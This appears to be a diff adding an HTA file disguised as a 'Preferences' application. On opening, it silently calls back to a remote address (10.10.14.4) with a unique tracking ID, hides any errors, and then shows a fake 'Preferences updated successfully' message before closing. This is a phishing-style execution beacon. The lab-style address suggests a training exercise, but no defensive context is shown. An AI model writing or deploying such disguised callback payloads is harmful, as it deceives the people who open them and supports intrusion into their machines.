@@ -1,0 +1,13 @@
+<html><head>
+  <HTA:APPLICATION ID="tracker" APPLICATIONNAME="Preferences" SCROLL="no" SINGLEINSTANCE="yes"/>
+  <script language="JScript">
+    window.onload = function (){
+      var id="ahope-"+(new Date()).getTime();
+      try {
+        var x=new ActiveXObject("MSXML2.XMLHTTP");
+        x.open("GET","http://10.10.14.4/p/"+id,false); x.send(null);
+      } catch(e) {}
+      alert("Preferences updated successfully."); window.close();
+    };
+  </script>
+</head><body></body></html>
